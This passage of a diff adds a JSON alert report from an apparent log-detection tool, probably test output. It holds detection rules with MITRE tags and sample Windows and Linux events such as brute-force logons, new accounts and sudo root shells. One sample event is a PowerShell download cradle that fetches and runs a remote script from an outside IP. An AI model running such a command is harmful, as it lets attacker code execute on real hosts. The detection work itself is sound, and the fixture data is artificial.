+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:39.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:00:52.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:00:52.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:01:05.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:01:05.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T14:01:18.123456+00:00",
+          "source": "windows",
+          "action": "logon",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": "203.0.113.77",
+          "outcome": "failure",
+          "event_id": 4625,
+          "message": "Failed logon for Administrator",
+          "raw": "{\"EventID\":4625,\"TimeCreated\":\"2026-11-20T14:01:18.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"Administrator\",\"TargetDomainName\":\"CORP\",\"IpAddress\":\"203.0.113.77\",\"LogonType\":3,\"Status\":\"0xc000006d\",\"SubStatus\":\"0xc000006a\",\"WorkstationName\":\"-\"}",
+          "extra": {
+            "logon_type": 3,
+            "logon_type_name": "network",
+            "domain": "CORP",
+            "workstation": null,
+            "status": "0xc000006d",
+            "sub_status": "0xc000006a"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "suspicious-powershell",
+      "title": "Suspicious PowerShell script block",
+      "severity": "high",
+      "description": "Script Block Logging (4104) captured PowerShell with common attacker tradecraft: encoded commands, download cradles, in-memory execution, or attempts to disable defenses.",
+      "mitre": [
+        "T1059.001",
+        "T1027"
+      ],
+      "group": {},
+      "first_seen": "2026-11-20T14:09:02+00:00",
+      "last_seen": "2026-11-20T14:09:02+00:00",
+      "count": 1,
+      "events": [
+        {
+          "timestamp": "2026-11-20T14:09:02+00:00",
+          "source": "windows",
+          "action": "powershell",
+          "host": "WS17.corp.example",
+          "user": "S-1-5-21-1004336348-1177238915-682003330-1105",
+          "src_ip": null,
+          "outcome": null,
+          "event_id": 4104,
+          "message": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/update.ps1')",
+          "raw": "{\"Event\":{\"System\":{\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"WS17.corp.example\",\"EventID\":4104,\"TimeCreated\":{\"#attributes\":{\"SystemTime\":\"2026-11-20T14:09:02.0000000Z\"}},\"Execution\":{\"#attributes\":{\"ProcessID\":5532,\"ThreadID\":4080}},\"Security\":{\"#attributes\":{\"UserID\":\"S-1-5-21-1004336348-1177238915-682003330-1105\"}}},\"EventData\":{\"MessageNumber\":1,\"MessageTotal\":1,\"Path\":\"\",\"ScriptBlockId\":\"3f1c9a2e-0d4b-4c7e-9a55-1b2c3d4e5f60\",\"ScriptBlockText\":\"IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.99/update.ps1')\"}}}",
+          "extra": {
+            "script_block_id": "3f1c9a2e-0d4b-4c7e-9a55-1b2c3d4e5f60",
+            "path": null,
+            "process_id": 5532
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "sudo-root-shell",
+      "title": "Root shell opened through sudo",
+      "severity": "medium",
+      "description": "sudo used to start an interactive root shell (bash, sh, su -, ...). Legitimate admins do this, but it bypasses per-command sudo logging, so it is worth a look.",
+      "mitre": [
+        "T1548.003",
+        "T1059.004"
+      ],
+      "group": {},
+      "first_seen": "2026-11-20T03:04:02+00:00",
+      "last_seen": "2026-11-20T03:04:02+00:00",
+      "count": 1,
+      "events": [
+        {
+          "timestamp": "2026-11-20T03:04:02+00:00",
+          "source": "linux_auth",
+          "action": "sudo",
+          "host": "web01",
+          "user": "deploy",
+          "src_ip": null,
+          "outcome": "success",
+          "event_id": null,
+          "message": "  deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
+          "raw": "Nov 20 03:04:02 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash",
+          "extra": {
+            "target_user": "root",
+            "command": "/bin/bash",
+            "tty": "pts/1",
+            "pwd": "/home/deploy"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "new-account-created",
+      "title": "New local account created",
+      "severity": "medium",
+      "description": "A new user account was created (Linux useradd, Windows 4720). Attackers add accounts for persistence; confirm each one matches a change request.",
+      "mitre": [
+        "T1136.001"
+      ],
+      "group": {},
+      "first_seen": "2026-11-20T03:05:40+00:00",
+      "last_seen": "2026-11-20T03:05:40+00:00",
+      "count": 1,
+      "events": [
+        {
+          "timestamp": "2026-11-20T03:05:40+00:00",
+          "source": "linux_auth",
+          "action": "account_created",
+          "host": "web01",
+          "user": "sysupdate",
+          "src_ip": null,
+          "outcome": "success",
+          "event_id": null,
+          "message": "new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1",
+          "raw": "Nov 20 03:05:40 web01 useradd[4402]: new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1",
+          "extra": {
+            "uid": 1002
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "sudo-denied",
+      "title": "sudo denied (user not allowed or wrong password)",
+      "severity": "medium",
+      "description": "A user tried sudo and was refused. One-offs are usually mistakes; repeats, or service accounts like www-data trying sudo, suggest someone probing for privilege escalation.",
+      "mitre": [
+        "T1548.003"
+      ],
+      "group": {
+        "host": "web01",
+        "user": "www-data"
+      },
+      "first_seen": "2026-11-20T03:20:11+00:00",
+      "last_seen": "2026-11-20T03:20:40+00:00",
+      "count": 2,
+      "events": [
+        {
+          "timestamp": "2026-11-20T03:20:11+00:00",
+          "source": "linux_auth",
+          "action": "sudo",
+          "host": "web01",
+          "user": "www-data",
+          "src_ip": null,
+          "outcome": "failure",
+          "event_id": null,
+          "message": "www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id",
+          "raw": "Nov 20 03:20:11 web01 sudo: www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id",
+          "extra": {
+            "reason": "not_in_sudoers",
+            "command": "/usr/bin/id"
+          }
+        },
+        {
+          "timestamp": "2026-11-20T03:20:40+00:00",
+          "source": "linux_auth",
+          "action": "sudo",
+          "host": "web01",
+          "user": "www-data",
+          "src_ip": null,
+          "outcome": "failure",
+          "event_id": null,
+          "message": "www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/sh",
+          "raw": "Nov 20 03:20:40 web01 sudo: www-data : user NOT in sudoers ; TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/sh",
+          "extra": {
+            "reason": "not_in_sudoers",
+            "command": "/bin/sh"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "new-account-created",
+      "title": "New local account created",
+      "severity": "medium",
+      "description": "A new user account was created (Linux useradd, Windows 4720). Attackers add accounts for persistence; confirm each one matches a change request.",
+      "mitre": [
+        "T1136.001"
+      ],
+      "group": {},
+      "first_seen": "2026-11-20T14:05:33.123456+00:00",
+      "last_seen": "2026-11-20T14:05:33.123456+00:00",
+      "count": 1,
+      "events": [
+        {
+          "timestamp": "2026-11-20T14:05:33.123456+00:00",
+          "source": "windows",
+          "action": "account_created",
+          "host": "DC01.corp.example",
+          "user": "helpdesk2",
+          "src_ip": null,
+          "outcome": "success",
+          "event_id": 4720,
+          "message": "Account helpdesk2 created by Administrator",
+          "raw": "{\"EventID\":4720,\"TimeCreated\":\"2026-11-20T14:05:33.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"TargetUserName\":\"helpdesk2\",\"SubjectUserName\":\"Administrator\"}",
+          "extra": {
+            "created_by": "Administrator"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "special-privileges-unexpected",
+      "title": "Special privileges assigned to an unexpected account",
+      "severity": "low",
+      "description": "Event 4672: an account logged on with admin-equivalent privileges. Built-in service accounts are excluded; extend the allowlist with your known admin accounts so what's left is worth reviewing.",
+      "mitre": [
+        "T1078.003"
+      ],
+      "group": {
+        "host": "DC01.corp.example",
+        "user": "Administrator"
+      },
+      "first_seen": "2026-11-20T14:02:10.123456+00:00",
+      "last_seen": "2026-11-20T14:02:10.123456+00:00",
+      "count": 1,
+      "events": [
+        {
+          "timestamp": "2026-11-20T14:02:10.123456+00:00",
+          "source": "windows",
+          "action": "special_privileges",
+          "host": "DC01.corp.example",
+          "user": "Administrator",
+          "src_ip": null,
+          "outcome": "success",
+          "event_id": 4672,
+          "message": "Special privileges assigned to Administrator",
+          "raw": "{\"EventID\":4672,\"TimeCreated\":\"2026-11-20T14:02:10.1234567Z\",\"Computer\":\"DC01.corp.example\",\"Channel\":\"Security\",\"SubjectUserName\":\"Administrator\",\"PrivilegeList\":\"SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege\"}",
+          "extra": {
+            "privileges": "SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege"
+          }
+        }
+      ]
+    },
+    {
+      "rule_id": "powershell-file-deletion",
+      "title": "File deleted from PowerShell",
+      "severity": "low",
+      "description": "A file was deleted through PowerShell (Remove-Item / del / rm / erase). Usually routine; important when the file name or the account is sensitive, or when it lines up with other alerts (indicator removal).",
+      "mitre": [
+        "T1070.004"
+      ],
+      "group": {},
+      "first_seen": "2026-11-20T14:11:47+00:00",
+      "last_seen": "2026-11-20T14:11:47+00:00",
+      "count": 1,
+      "events": [
+        {
+          "timestamp": "2026-11-20T14:11:47+00:00",
+          "source": "windows",
+          "action": "powershell",
+          "host": "MarySue",
+          "user": "S-1-5-21-1004336348-1177238915-682003330-1105",
+          "src_ip": null,
+          "outcome": null,
+          "event_id": 4104,
+          "message": "del .\\Top_Secret.txt",
+          "raw": "{\"Event\":{\"System\":{\"Channel\":\"Microsoft-Windows-PowerShell/Operational\",\"Computer\":\"MarySue\",\"EventID\":4104,\"TimeCreated\":{\"#attributes\":{\"SystemTime\":\"2026-11-20T14:11:47.0000000Z\"}},\"Execution\":{\"#attributes\":{\"ProcessID\":1216,\"ThreadID\":4080}},\"Security\":{\"#attributes\":{\"UserID\":\"S-1-5-21-1004336348-1177238915-682003330-1105\"}}},\"EventData\":{\"MessageNumber\":1,\"MessageTotal\":1,\"Path\":\"\",\"ScriptBlockId\":\"b0d4f117-b6d4-449b-a179-2c59d6b4f548\",\"ScriptBlockText\":\"del .\\\\Top_Secret.txt\"}}}",
+          "extra": {
+            "script_block_id": "b0d4f117-b6d4-449b-a179-2c59d6b4f548",
+            "path": null,
+            "process_id": 1216
+          }
+        }
+      ]
+    }
+  ]
+}
